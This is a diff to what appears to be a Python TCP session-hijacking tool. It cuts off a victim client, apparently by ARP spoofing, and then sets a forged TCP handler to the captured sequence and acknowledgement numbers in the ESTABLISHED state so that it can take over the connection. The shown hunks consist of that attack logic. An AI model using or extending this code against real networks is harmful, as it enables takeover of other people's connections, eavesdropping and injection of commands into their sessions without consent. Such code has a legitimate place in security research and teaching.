@@ -120,16 +120,7 @@ arp_msg_server = eth.ArpMessage(arp_data_server)
 eth_handler = eth.EthernetHandler(if_name, local_mac=my_mac, remote_mac=client_mac, block=0)
 hijacked = False
 
-# prepare TCP parameters and handler
 tcp_handler = tcp.TCPHandler(if_name, client_port, server_ip)
-tcp_handler.remote_port = server_port
-tcp_handler.local_ip = client_ip
-tcp_handler._rcv_nxt = ack_nr
-tcp_handler._snd_nxt = seq_nr
-tcp_handler._snd_una = seq_nr
-tcp_handler._snd_wnd = 65535
-tcp_handler._rem_rwnd = 65535
-tcp_handler.state = tcp.TCPHandler.ESTABLISHED
 ch = chr(0)
 
 # configure terminal and start
@@ -194,6 +185,16 @@ try:
                             rgb=(100, 100, 100), bold=False)
                     cut_off_client(if_name, client_ip, server_ip, client_port,
                             server_port, seq_nr, ack_nr)
+                    # prepare TCP parameters and handler
+                    tcp_handler.remote_port = server_port
+                    tcp_handler.local_port = client_port
+                    tcp_handler.local_ip = client_ip
+                    tcp_handler._rcv_nxt = ack_nr
+                    tcp_handler._snd_nxt = seq_nr
+                    tcp_handler._snd_una = seq_nr
+                    tcp_handler._snd_wnd = 65535
+                    tcp_handler._rem_rwnd = 65535
+                    tcp_handler.state = tcp.TCPHandler.ESTABLISHED
                     hijacked = True
                     new_tty_attr[3] |= termios.ECHO
                     termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
